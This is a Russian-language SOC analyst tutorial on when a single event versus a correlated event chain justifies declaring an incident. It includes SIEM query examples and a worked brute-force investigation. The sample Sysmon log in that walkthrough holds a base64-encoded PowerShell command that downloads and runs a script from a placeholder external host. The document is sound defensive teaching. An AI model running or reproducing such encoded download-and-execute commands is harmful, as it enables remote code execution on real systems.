# Одиночное событие и цепочка событий как основание инцидента в SOC

## Базовые понятия: событие, алерт, инцидент и цепочка

Работа аналитика SOC уровня 1 (L1) начинается с наблюдения за **событиями (events)**. Событие в контексте кибербезопасности — это атомарная запись о некотором действии или состоянии, зафиксированная средством мониторинга. Источником события может быть операционная система (Windows Event Log, syslog), сетевое устройство (межсетевой экран, маршрутизатор), средство обнаружения вторжений (IDS/IPS), антивирус, EDR-агент, веб-сервер, база данных или приложение. Каждое событие обладает меткой времени, идентификатором источника, типом и набором специфичных полей.

Не каждое событие представляет угрозу. Ежедневно в корпоративной среде генерируются миллионы событий, 99,9 % которых являются легитимными. Задача SIEM (Security Information and Event Management) — собрать эти события, нормализовать и с помощью правил корреляции выделить те, которые могут указывать на вредоносную активность. Результат работы правила корреляции — **алерт (alert)**. Алёрт — это уже «подозрительное» событие или уведомление, сформированное SIEM, требующее внимания аналитика. Наконец, если алерт после анализа признан действительным нарушением политики безопасности, политики конфиденциальности или указывает на реализованную угрозу, он инициирует **инцидент (incident)**.

Путаница между терминами — частая проблема начального этапа обучения. Важно чётко разделять одиночное событие, алерт и инцидент. В контексте вопроса «что является основанием для инцидента» центральное место занимают две сущности: **одиночное событие**, которое само по себе может инициировать эскалацию, и **цепочка событий** — последовательность связанных событий, которая в совокупности превращает разрозненные записи в убедительное свидетельство атаки.

Сравнительная таблица ниже фиксирует разграничение понятий и их роль в рабочем процессе SOC L1.

| Термин | Определение | Характеристики и примеры | Роль в анализе SOC L1 |
| --- | --- | --- | --- |
| Событие (Event) | Элементарная запись о действии, состоянии или изменении в системе. Исходный, необработанный элемент. | Примеры: успешный вход пользователя (Windows Event ID 4624), запрос к веб-серверу с кодом 200, блокировка пакета на межсетевом экране. Поля: timestamp, host, source, event ID, user и др. | Сырой материал для анализа. L1-аналитик просматривает события при помощи запросов для выяснения контекста алерта. |
| Алёрт (Alert) | Сигнал, автоматически сгенерированный SIEM или средством защиты, что произошло нечто подозрительное, требующее проверки. | Примеры: «Множественные неудачные попытки входа (Event ID 4625) от одного IP», «Детектирование запуска нетипичного процесса по правилу корреляции». Содержит агрегированные поля и оценку severity. | Основной рабочий объект L1. Каждый алерт должен быть разобран, проверен на ложное срабатывание, и либо закрыт, либо эскалирован. |
| Инцидент (Incident) | Подтверждённый факт нарушения политики безопасности или реализованной угрозы, требующий реагирования. | Примеры: успешная атака грубой силой, зафиксированный факт закрепления злоумышленника на хосте, утечка данных. Обычно оформляется тикетом с уникальным идентификатором. | Результат успешного анализа алерта/алертов. На этом этапе L1 передаёт задачу аналитикам L2/L3, начинается процесс реагирования. |
| Цепочка событий (Event Chain) | Последовательность событий, связанных общим контекстом (время, источник, целевой объект), которая описывает развитие атаки. | Пример: цепочка «множественные неудачные входы (4625) → успешный вход (4624) → создание процесса (Sysmon Event ID 1) → сетевое соединение (Sysmon Event ID 3)». | Контекстное богатство. Именно цепочка, а не одиночное событие, чаще всего служит основанием для эскалации алерта в инцидент, потому что показывает полную картину атаки. |

L1-аналитик должен видеть разницу между изолированным алертом на одиночное событие, которое часто оказывается шумом, и срабатыванием, основанным на цепочке событий. Например, единичная неудачная попытка входа может быть опечаткой пользователя — это событие. Если за минуту от одного IP произошло 50 таких попыток, SIEM сгенерирует алерт на одиночное событие (группа событий, агрегированная как одно правило). Дополнительные события успешного входа с последующей подозрительной активностью превращают алерт в инцидент. Таким образом, основанием для инцидента может выступать как одиночное событие, так и цепочка. На практике второй вариант более надёжен и реже ведёт к ложным эскалациям.

## Внутреннее устройство: анатомия события и механика формирования цепочек

Предметная область включает два класса объектов: одиночное событие как элементарная информационная единица и цепочка событий как производный объект, конструируемый правилами корреляции или средствами аналитики. Рассмотрим их устройство последовательно.

### Одиночное событие: поля, форматы, источники

Независимо от источника всякое событие, попадающее в SIEM, представляет из себя структурированную запись. Нормализация приводит события от разнородных систем к унифицированной модели. Условная JSON-схема события выглядит так (иллюстративная схема полей):

```json
{
   "@timestamp": "2025-01-15T10:33:21+0000",
   "event": {
      "kind": "alert|event|metric",
      "category": "authentication|process|network|...",
      "action": "logon_failure|process_start|connection_attempt",
      "code": "4625",
      "severity": 3,
      "provider": "Microsoft-Windows-Security-Auditing"
   },
   "host": {
      "name": "srv-dc01",
      "ip": "192.168.1.10",
      "domain": "corp.local"
   },
   "source": {
      "ip": "10.10.20.34",
      "user": "jsmith"
   },
   "message": "An account failed to log on."
}
```

В зависимости от SIEM-платформы схема может варьироваться (Elastic Common Schema, Splunk Common Information Model, ArcSight CEF), но ключевыми остаются поля: время, идентификатор события (код/тип), источник (IP, хост), целевой объект (пользователь, файл, процесс), результат действия и дополнительные контекстные поля.

Источники событий и их типичные идентификаторы — основа для понимания того, какие одиночные события могут служить основанием для инцидента. Следующая таблица даёт сводку наиболее значимых источников в типовой корпоративной среде и их ключевых событий.

| Источник | Ключевые идентификаторы | Важные поля | Пример одиночного события, способного стать инцидентом |
| --- | --- | --- | --- |
| Windows Security Log | 4624 (успешный вход), 4625 (неудачный вход), 4672 (назначение привилегий), 5140 (доступ к сетевой папке), 4720 (создание пользователя) | TargetUserName, IpAddress, LogonType, ProcessName | Network logon (type 3) под учётной записью администратора с нехарактерного IP (основание — привилегия и аномальный источник). |
| Sysmon (Microsoft-Windows-Sysmon) | 1 (создание процесса), 3 (сетевое соединение), 7 (загрузка образа), 8 (создание потока в другом процессе), 11 (создание файла) | Image, CommandLine, ParentImage, SourceIp, DestinationIp | Запуск PowerShell с командой загрузки и выполнения скрипта (Event ID 1 с явно вредоносной командной строкой). |
| Linux syslog/auth.log | pam_unix(su:session), sudo, sshd (Failed password, Accepted publickey) | User, source IP, process | Успешная аутентификация по SSH от root с незнакомого адреса (событие auth.log). |
| Межсетевой экран/Next-Gen FW | Traffic log, Threat log (ID сигнатуры IPS) | Source IP, Destination IP, Application, Action (allow/deny) | Обнаружение трафика на известные C2-адреса по базе репутации (одиночное событие с категорией Command-and-Control). |
| EDR-агент (CrowdStrike, MS Defender for Endpoint) | Собственные типы детектирований | Process name, Command line, Technique ID (MITRE), Severity | Детектирование техники Process Injection в процесс lsass.exe. |

### Цепочка событий: статические и динамические методы корреляции

Цепочка событий не возникает сама по себе. Она является продуктом корреляции — процесса установления связей между событиями на основе правил, статистических моделей или анализа последовательностей. В современных SIEM используются три главных подхода.

**Правила, основанные на статических шаблонах (rule-based correlation).** Наиболее распространённый метод. Правило определяет набор условий, которым должны удовлетворять события, и временное окно, в котором они должны произойти. Например, классическое правило выявления атаки перебором паролей с последующим успехом: «Если за последние 5 минут от одного IP произошло более 10 событий Event ID 4625, а затем событие Event ID 4624 для того же пользователя — сгенерировать алерт». Результат правила — алерт, содержащий ссылки на исходные события, т.е. готовую цепочку.

**Корреляция на основе правил с сохранением состояния (stateful correlation).** Более сложный вариант, когда SIEM отслеживает состояние атаки по шагам. Например, модель на основе килл-чейна (Lockheed Martin Cyber Kill Chain): состояние «Reconnaissance» → «Delivery» → «Exploitation» → «Installation» → «Command & Control» → «Actions on Objectives». Как только последний шаг удовлетворён, формируется инцидент. Такой тип корреляции позволяет повысить confidence алерта, не поднимая шум на каждом отдельном этапе.

**Динамические и поведенческие методы (статистика, ML).** Здесь цепочка не предопределена жёстко, а выявляется статистическими аномалиями или моделями машинного обучения. Например, UEBA (User and Entity Behavior Analytics) строит профиль нормальной активности пользователя (базовую линию) и детектирует аномальную последовательность событий: пользователь всегда логинился с домашнего ПК, а сегодня — напрямую на базу данных с сервера приложений. Сама последовательность становится основанием для алерта.

### Как цепочка превращается в инцидент

Основанием для инцидента может служить:

- **Одиночное событие высокой критичности**, признанное самодостаточным (например, срабатывание сигнатуры известной угрозы с высокой достоверностью).
- **Цепочка событий**, подтверждающая вредоносный сценарий. Здесь решающей является комбинация нескольких индикаторов: нельзя проигнорировать единичную неудачную попытку входа, но нельзя и бездумно эскалировать любой всплеск 4625 без подтверждения успешного входа и последующей аномальной активности.

Схематично трансформация цепочки в инцидент выглядит так:

```text
[Событие A: 4625] ────┐
[Событие B: 4625] ────┤
[Событие C: 4625] ────┤
[Событие D: 4624] ────┤───(правило корреляции)───▶ Алерт
[Событие E: 4625] ────┤
[Событие F: 4625] ────┘
                     │
                     ▼
            Алерт (цепочка событий)
                     │
                     ▼ (анализ L1)
               Инцидент (эскалация)
```

Цепочка, демонстрирующая шаги атаки, даёт аналитику уверенность (confidence) и снижает риск ложной эскалации. Поэтому в зрелых SOC акцент делается именно на корреляцию цепочек, а не на единичные сигнатуры.

## Работа аналитика L1 с событиями и цепочками

Аналитик уровня 1 — первая линия обороны, его ключевая задача **триаж** (triage): быстрая оценка алертов и принятие решения о необходимости эскалации. Рабочий процесс строится вокруг двух типовых сценариев: анализ изолированного алерта на одиночное событие и анализ алерта, основанного на цепочке событий.

### Типовые операции и процедуры

**1. Верификация одиночного события.** Когда поступает алерт, сгенерированный на основе одного события (или агрегированных однотипных событий), аналитик должен быстро ответить на вопросы: легитимно ли это событие? Не является ли оно ложным срабатыванием?
- **Проверка контекста:** смотрит на IP-адрес источника — принадлежит ли он корпоративной сети, геолокацию, репутацию (TI-фиды). Проверяет учётную запись — не отключена ли она, не истек ли пароль. Уточняет время — рабочее ли было время, соответствует ли профилю пользователя.
- **Исторический поиск:** выполняет в SIEM поиск аналогичных событий за последние часы/дни. Если такой же IP ранее уже выполнял легитимные действия, подозрительность снижается.
- **Пивот (pivot):** использует найденные значения полей для быстрого перехода к связанным событиям. Например, из алерта на 4625 можно сразу запросить события 4624 для того же пользователя за тот же промежуток времени.

**2. Анализ цепочки событий.** Если алерт содержит ссылки на несколько событий (например, правило корреляции связало 4625, 4624 и запуск процесса), аналитик восстанавливает хронологию. Он строит мысленную временную шкалу или использует инструменты визуализации SIEM. Основные шаги:
- Проверка последовательности: действительно ли сначала шли неудачные входы, затем успешный, затем процесс.
- Оценка длительности: была ли атака быстрой (автоматизированный скрипт) или растянутой (ручная).
- Идентификация источника: один ли у всей цепочки IP или несколько; если IP менялся, это может указывать на проксификацию или цепочку прокси.
- Анализ артефактов процесса (если есть Sysmon Event ID 1): командная строка, родительский процесс, пользователь.

**3. Принятие решения об эскалации.** Критерии эскалации обычно формализованы в SLA и internal SOP:
- Severity алерта (обычно High и Critical требуют немедленной реакции).
- Результаты первичного анализа: если обнаружено подтверждение вредоносности (например, процесс запускает инструмент разведки), confidence повышается до уровня, необходимого для объявления инцидента.
- Impact: затронут ли критичный актив (контроллер домена, сервер баз данных).
Если решение об эскалации принято, L1 создаёт инцидент-заявку в системе класса Service Desk / SOAR, прикладывает таймлайн событий и описание, после чего передаёт аналитикам L2/L3.

### Инструментарий и практические приёмы

Для выполнения перечисленных операций аналитик использует язык запросов SIEM (Splunk SPL, Elastic KQL, QRadar AQL). Ниже приведены иллюстративные запросы, демонстрирующие типовые приёмы работы с одиночными событиями и цепочками. Все примеры используют абстрактный синтаксис, близкий к Splunk SPL; в реальности команды и имена полей зависят от внедрённой модели данных.

**Поиск одиночного типа событий с фильтрацией:**

```spl
index=wineventlog EventCode=4625
| stats count by TargetUserName, IpAddress
| where count > 10
| sort - count
```
*Действие:* показывает пользователей и IP, для которых за выбранный период было более 10 неудачных попыток входа. Это помогает выделить подозрительный хост из массы единичных сбоев.

**Пивот от события к связанным событиям по имени учётной записи и времени:**

```spl
index=wineventlog (EventCode=4625 OR EventCode=4624) TargetUserName="jsmith"
| transaction TargetUserName maxspan=10m
| search count>5
| table _time, TargetUserName, EventCode, IpAddress
```
*Действие:* строит сессии (транзакции) по пользователю jsmith длительностью до 10 минут и показывает хронологию входов. Аналитик видит чередование неудач и успеха.

**Поиск цепочки событий с участием Sysmon:**

```spl
index=sysmon EventCode=1 OR EventCode=3 src_ip="10.10.20.34"
| eval process=if(EventCode==1, Image, null())
| eval network=if(EventCode==3, dest_ip, null())
| stats values(process) as Processes, values(network) as Destinations by _time
| sort _time
```
*Действие:* для подозрительного IP извлекает все запуски процессов и сетевые соединения, группируя по времени. Такой вывод позволяет увидеть полную картину действий на хосте после входа.

### Типичные ошибки и подводные камни

Начинающие аналитики часто допускают следующие ошибки:

- **Переоценка одиночного события.** Эскалация каждого алерта, особенно высокого severity без контекста, приводит к усталости от ложных срабатываний (alert fatigue). Классический пример: правило «Вход с необычного географического расположения» срабатывает, но это реальный пользователь с VPN. Нужно всегда искать дополнительные подтверждения.
- **Игнорирование низкокритичных событий.** Серьёзные инциденты часто начинаются с малозначительных событий: один 4625 никто не заметит, но если таких десятки, и затем успех — пора бить тревогу. Поэтому важно не закрывать алерты на одиночные события без быстрого пивота.
- **Зацикливание на одном типе корреляции.** Полагаться только на статические правила опасно. Атакующие адаптируются, и SOC должен комбинировать сигнатурные и поведенческие методы. L1-аналитик должен уметь работать не только с готовыми алертами, но и с поиском цепочек вручную (threat hunting начального уровня).
- **Неиспользование таймлайна.** При эскалации инцидента без собранной временной шкалы событий аналитик L2 тратит время на повторный сбор. Правило хорошего тона — прикладывать к заявке структурированный таймлайн, даже если это простой список.

## Сквозной практический пример: от одиночного события к подтверждённому инциденту

### Исходные условия

Среда: корпоративная Windows-сеть, контроллер домена DC01, рабочая станция WSUS-01. На всех хостах включены стандартные журналы безопасности Windows и установлен Sysmon с типовой конфигурацией (SwiftOnSecurity). Сбор логов производится в SIEM (платформа, использующая SPL-подобный язык поиска). Аналитик L1 видит на консоли алерт, сгенерированный правилом «Brute Force Attempt Followed by Success». Алёрт содержит ссылки на несколько событий, но для первичной оценки аналитику необходимо самостоятельно проверить цепочку вручную.

### Шаг 1. Получение алерта и первичная оценка

Алерт выглядит как JSON-объект, показывающий агрегированную информацию. Упрощённый фрагмент:

```json
{
  "alert_id": "d01b2c3e-4f56-7890-abcd-ef1234567890",
  "rule_name": "Brute Force to Success Login",
  "severity": "High",
  "source_ip": "203.0.113.42",
  "target_user": "svc-backup",
  "time_window": "2025-02-12T04:12:00 to 2025-02-12T04:17:00",
  "events": {
    "failure_count": 53,
    "success_count": 1,
    "sample_failure_event_id": "4625",
    "success_event_id": "4624"
  },
  "host": "DC01.corp.local"
}
```

На первый взгляд, IP-адрес `203.0.113.42` не принадлежит корпоративной сети, а время 04:12 UTC (не рабочее для местного часового пояса). Учётная запись `svc-backup` — сервисная. Это уже делает алерт интересным. Аналитик выполняет проверку: ищет упоминания этого IP в открытых Threat Intelligence-фидах (этот шаг не требует команды, здесь просто проверка). Предположим, IP не найден в базах, но это не снимает подозрений.

### Шаг 2. Пивот к детальным событиям и построение таймлайна

Аналитик извлекает все события за соответствующий период с интересующего IP и для учётной записи `svc-backup`. Используется запрос, объединяющий два источника:

```spl
(index=wineventlog source="WinEventLog:Security" EventCode=4625 OR EventCode=4624)
| search IpAddress="203.0.113.42" TargetUserName="svc-backup"
| eval status=case(EventCode==4625, "Failure", EventCode==4624, "Success")
| table _time, host, status, EventCode, IpAddress, LogonType
| sort _time
```

Ожидаемый вывод (фрагмент):

```
_time               host    status   EventCode IpAddress      LogonType
2025-02-12 04:12:01 DC01    Failure  4625      203.0.113.42   3
2025-02-12 04:12:02 DC01    Failure  4625      203.0.113.42   3
...
2025-02-12 04:14:18 DC01    Failure  4625      203.0.113.42   3
2025-02-12 04:14:55 DC01    Success  4624      203.0.113.42   3
```

53 неудачных события, за которыми через 37 секунд следует успешный вход с LogonType 3 (сетевой вход). Это типичный шаблон успешной атаки подбора пароля. Теперь аналитик хочет выяснить, что произошло после успешного входа — была ли какая-либо пост-эксплуатационная активность. Для этого выполняется запрос к журналам Sysmon на контроллере домена DC01, ограниченный временным интервалом от успешного входа плюс 5 минут.

```spl
index=sysmon host="DC01.corp.local" EventCode=1 OR EventCode=3
 earliest="2025-02-12T04:14:55" latest="2025-02-12T04:19:55"
| where User="corp\\svc-backup"
| eval activity=if(EventCode==1, "Process start: ".Image." ".CommandLine, "Network to: ".DestinationIp.":".DestinationPort)
| table _time, activity
| sort _time
```

Вывод показывает только одну запись процесса (Event Code 1):

```
_time               activity
2025-02-12 04:15:12 Process start: C:\Windows\System32\cmd.exe /c "powershell -enc SQBFAFgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYgBhAGQALgBlAHgAYQBtAHAAbABlAC4AYwBvAG0ALwBzAGMAcgBpAHAAdAAuAHAAcwAxACcAKQApAAoA"
```

Расшифровка Base64 (выполняется отдельно) показывает команду загрузки и выполнения скрипта с внешнего URL. Это однозначно вредоносная активность.

### Шаг 3. Конструирование цепочки и принятие решения

Аналитик формирует итоговую цепочку событий:

1. `04:12:01–04:14:18` 53 события 4625 (неудачный вход) с IP 203.0.113.42.
2. `04:14:55` Событие 4624 — успешный вход под `svc-backup` (тип 3).
3. `04:15:12` Sysmon Event 1 — запуск cmd.exe, который запускает PowerShell с зашифрованной командой загрузки вредоносного скрипта.

Этой цепочки достаточно для уверенного суждения: произошёл успешный взлом сервисной учётной записи с последующим выполнением кода на контроллере домена. Степень достоверности высокая. Одиночного события (всплеска 4625) было бы недостаточно для эскалации — могли быть просто сканирования или ошибки приложения. Но появление успешного входа и особенно вредоносного процесса превращают последовательность в полноценный инцидент.

Аналитик создаёт заявку в системе класса Incident Response с таймлайном, представленным в виде ASCII-диаграммы:

```
04:12 ────┬─── 4625 x53
04:14 ────┼─── 4624 Success
04:15 ────┴─── Sysmon1: powershell -enc ...
```

### Ожидаемый вывод

Пример демонстрирует, как аналитик первого уровня должен трансформировать первоначальный алерт на одиночное агрегированное событие в расследование цепочки событий. Именно цепочка — последовательная смена фаз атаки, собранная из разрозненных записей, — становится основанием для констатации инцидента и эскалации на следующие линии. Одиночное событие в данном сценарии играет роль начального индикатора, но без контекста оно не может служить единственным основанием. Цепочка подтверждает вредоносность и даёт полную картину атаки, позволяя L2-команде быстро начать реагирование без дополнительного сбора данных.
